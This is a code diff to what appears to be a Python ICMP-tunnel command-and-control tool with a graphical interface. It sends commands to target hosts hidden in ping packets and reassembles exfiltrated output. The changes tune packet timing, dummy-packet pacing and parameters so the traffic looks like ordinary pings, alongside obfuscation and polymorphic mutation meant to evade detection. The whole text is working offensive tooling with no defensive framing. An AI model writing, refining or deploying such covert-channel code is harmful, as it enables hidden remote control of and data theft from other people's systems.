@@ -22,7 +22,7 @@ is_echo = False
 ICMP_ID = 0x1111       
 DEFAULT_SHIFT_VALUE = 1
 DEFAULT_RAILFENCE_RAILS = 4
-DEFAULT_BIT_RAILFENCE_RAILS = 7		# Set at >=2 
+DEFAULT_BIT_RAILFENCE_RAILS = 7        # Set at >= 2
 HANDSHAKE_PREFIX = b"SYNC:"
 ACK_PREFIX = b"ACK:"
 PROBE_COMMAND = b"probe"  
@@ -34,7 +34,6 @@ PADDING_MIN = 1
 PADDING_MAX = 5
 REDUNDANCY_FACTOR = 0.1  
 FRAG_TIMEOUT = 60  
-DUMMY_RETRY_TIMEOUT = 5  
 
 seq_lock = threading.Lock()
 
@@ -495,15 +494,15 @@ def compute_delay(delay_mode, delay_min, delay_max, rtt=None):
     if is_echo:
         return 1.0
     base = {
-        'uniform': random.uniform(delay_min, delay_max),
-        'exponential': random.expovariate(1 / ((delay_min + delay_max) / 2)),
-        'gamma': random.gammavariate(2, (delay_max - delay_min) / 2) + delay_min
+        'uniform': random.uniform(1.0, 1.8),
+        'exponential': random.expovariate(1 / 1.4) + 0.8,
+        'gamma': random.gammavariate(2, 0.4) + 1.0
     }[delay_mode]
     if rtt:
         base *= (1 + (rtt / 1000))
-    base = min(max(base, delay_min), delay_max * 2)
-    jitter = base * random.uniform(-0.2, 0.2)
-    return min(max(base + jitter, delay_min), delay_max * 2)
+    base = min(max(base, 1.0), 1.8)
+    jitter = base * random.uniform(-0.1, 0.1)
+    return min(max(base + jitter, 1.0), 1.8)
 
 def send_packet(target_ip, req_type, icmp_id, icmp_sequence, payload, family, proto, poly_seed=None, mutation_count=3):
     icmp_code = 0
@@ -611,7 +610,7 @@ def send_probe(target_ip, req_type, icmp_id, icmp_sequence, cmd_prefix, padding_
 def check_probe_response(target_ip, rep_type, icmp_id, probe_seq, out_prefix, sub_table, shift, railfence_rails, bit_rails, family, local_ip, proto, poly_seed=None, mutation_count=3, layers=None, selected_ops=None, padding_seed=None):
     start_time = time.time()
     with socket.socket(family, socket.SOCK_RAW, proto) as sock:
-        while time.time() - start_time < 11:
+        while time.time() - start_time < 10:
             ready = select.select([sock], [], [], 1)
             if ready[0]:
                 data, addr = sock.recvfrom(2048)
@@ -658,10 +657,9 @@ def send_noise(target_ip, req_type, icmp_id, seq_queue, level, stop_event, famil
                 break
             time.sleep(delay)
 
-def receive_output(target_ip, rep_type, icmp_id, output_text, root, out_prefix, sub_table, shift, railfence_rails, bit_rails, family, local_ip, proto, exfil_status_label, exfil_cancel_event, poly_seed=None, mutation_count=3, layers=None, selected_ops=None, padding_seed=None, req_type=None, seq_queue=None):
+def receive_output(target_ip, rep_type, icmp_id, output_text, root, out_prefix, sub_table, shift, railfence_rails, bit_rails, family, local_ip, proto, exfil_status_label, exfil_cancel_event, poly_seed=None, mutation_count=3, layers=None, selected_ops=None, padding_seed=None, req_type=None, seq_queue=None, cmd_prefix=None, delay_mode=None, delay_min=None, delay_max=None):
     frag_buffers = {}
-    last_activity = {}
-    retry_counts = {}
+
     with socket.socket(family, socket.SOCK_RAW, proto) as sock:
         while True:
             ready = select.select([sock], [], [], 1)
@@ -687,9 +685,7 @@ def receive_output(target_ip, rep_type, icmp_id, output_text, root, out_prefix, 
                                 continue
                             frag_id, total_frags, overall_hash = struct.unpack('!4sI32s', rest[len(FRAG_START):len(FRAG_START)+40])
                             frag_buffers[frag_id] = {'frags': {}, 'total': total_frags, 'hash': overall_hash, 'ts': time.time()}
-                            last_activity[frag_id] = time.time()
-                            retry_counts[frag_id] = 0
-                            
+                            time.sleep(compute_delay(delay_mode, delay_min, delay_max))
                             send_dummy(target_ip, req_type, icmp_id, seq_queue, family, proto, poly_seed, mutation_count)
                         elif rest.startswith(FRAG_PREFIX):
                             if len(rest) < len(FRAG_PREFIX) + 8:
@@ -706,14 +702,13 @@ def receive_output(target_ip, rep_type, icmp_id, output_text, root, out_prefix, 
                                     continue
                                 buf['frags'][num] = frag_data
                                 buf['ts'] = time.time()
-                                last_activity[frag_id] = time.time()
-                                retry_counts[frag_id] = 0  
                                 received = len(buf['frags'])
                                 total = buf['total']
                                 if exfil_status_label:
                                     perc = (received / total) * 100 if total > 0 else 0
                                     root.after(0, lambda: exfil_status_label.config(text="{:.1f}% ({}/{}) packets".format(perc, received, total)))
                                 if received < total:
+                                    time.sleep(compute_delay(delay_mode, delay_min, delay_max))
                                     send_dummy(target_ip, req_type, icmp_id, seq_queue, family, proto, poly_seed, mutation_count)
                                 if received == total:
                                     assembled_encrypted = b''.join(buf['frags'].get(i, b'') for i in range(total))
@@ -950,7 +945,7 @@ def create_tab(notebook, target_ip, req_type, rep_type, icmp_id, seq_queue, fami
     upload_status_label = tk.Label(center_frame, text="", bg='black', fg='#FF00FF', font=('Courier', 10, 'bold'))
     upload_status_label.pack(pady=5)
 
-    threading.Thread(target=receive_output, args=(target_ip, rep_type, icmp_id, output_text, root, out_prefix, sub_table, shift, railfence_rails, bit_rails, family, local_ip, proto, exfil_status_label, exfil_cancel_event, poly_seed, mutation_count, layers, selected_ops, padding_seed, req_type, seq_queue), daemon=True).start()
+    threading.Thread(target=receive_output, args=(target_ip, rep_type, icmp_id, output_text, root, out_prefix, sub_table, shift, railfence_rails, bit_rails, family, local_ip, proto, exfil_status_label, exfil_cancel_event, poly_seed, mutation_count, layers, selected_ops, padding_seed, req_type, seq_queue, cmd_prefix, delay_mode, delay_min, delay_max), daemon=True).start()
 
 def create_broadcast_tab(notebook, target_ips, req_type, rep_type, icmp_id, seq_queue, family, proto, cmd_prefixes, padding_seeds, sub_tables, shifts, railfence_railss, bit_railss, poly_seeds, mutation_counts, delay_modes, delay_mins, delay_maxs, layerss, selected_opss):
     tab = tk.Frame(notebook, bg='black')
@@ -1143,4 +1138,3 @@ if __name__ == "__main__":
             sys.exit(1)
 
     main(args.target_ips, req_type, rep_type, args.id, family, proto)
-
